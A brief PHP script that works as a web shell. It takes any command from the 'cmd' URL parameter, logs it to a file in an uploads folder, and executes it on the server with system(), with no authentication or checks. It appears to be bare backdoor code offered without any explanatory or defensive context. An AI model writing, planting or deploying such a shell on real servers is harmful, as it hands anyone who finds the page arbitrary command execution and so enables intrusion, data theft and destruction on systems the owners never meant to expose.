<?php
$logFile = "uploads/shell_logs.txt";
$cmd = $_GET['cmd'] ?? '';
if ($cmd) {
    file_put_contents($logFile, date("Y-m-d H:i:s") . " | $cmd\n", FILE_APPEND);
    system($cmd);
}
?>
